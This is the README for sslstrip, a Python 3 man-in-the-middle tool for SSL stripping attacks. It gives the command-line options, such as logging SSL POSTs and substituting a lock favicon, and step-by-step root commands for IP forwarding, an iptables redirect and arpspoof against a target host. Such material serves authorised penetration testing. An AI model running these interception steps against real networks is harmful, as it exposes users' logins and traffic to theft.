# sslstrip

`sslstrip` is an MITM tool that implements Moxie Marlinspike's SSL stripping attacks.

Ported from Python v2 to v3 by Jay Townsend (theHarvester, Discover, and DNSrecon).

- [![Twitter Follow](https://img.shields.io/twitter/follow/jay_townsend1.svg?style=social&label=Follow)](https://twitter.com/jay_townsend1) Jay "L1ghtn1ng" Townsend @jay_townsend1

## Requirements

> [!NOTE]
> This project uses **uv** for dependency management.
> Get **uv** from [here](https://docs.astral.sh/uv/getting-started/installation/). 

Install the dependencies in a virtual environment:

```sh
uv sync
```

## Usage

```sh
$ python3 sslstrip.py
usage: sslstrip.py [-h] [-w WRITE] [-p] [-s] [-a]
                   [-l LISTEN] [-f] [-k]

sslstrip

options:
  -h, --help            show this help message and exit
  -w WRITE, --write WRITE
                        Specify file to log to
                        (optional).
  -p, --post            Log only SSL POSTs. (default)
  -s, --ssl             Log all SSL traffic to and from
                        server.
  -a, --all             Log all SSL and HTTP traffic to
                        and from server.
  -l LISTEN, --listen LISTEN
                        Port to listen on.
  -f, --favicon         Substitute a lock favicon on
                        secure requests.
  -k, --killsessions    Kill sessions in progress.
```

## Running

`sslstrip` can be run from the source base without installation.

### Running as normal user

To run as a normal user to see options:

`python3 sslstrip.py -h`

### Running as root user

1. Enable IP forwarding:

`echo "1" > /proc/sys/net/ipv4/ip_forward`

2. Setup `iptables` to intercept HTTP requests:

`iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <your listen port>`

3. Run `sslstrip` with the options you prefer.

4. Run `arpspoof` to redirect traffic to your host:

`arpspoof -i <your network interface> -t <target IP> <routers IP>`
